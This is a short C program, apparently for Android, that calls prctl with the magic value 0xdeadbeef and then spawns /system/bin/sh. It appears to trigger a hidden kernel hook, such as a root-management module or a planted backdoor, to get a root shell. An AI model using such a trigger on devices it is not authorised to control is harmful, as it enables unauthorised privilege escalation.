#include <unistd.h>
#include <stdlib.h>
#include <sys/prctl.h>

int main(){
    int32_t result = 0;
    prctl(0xdeadbeef, 0, 0, 0, &result);
    system("/system/bin/sh");
    return 0;
}
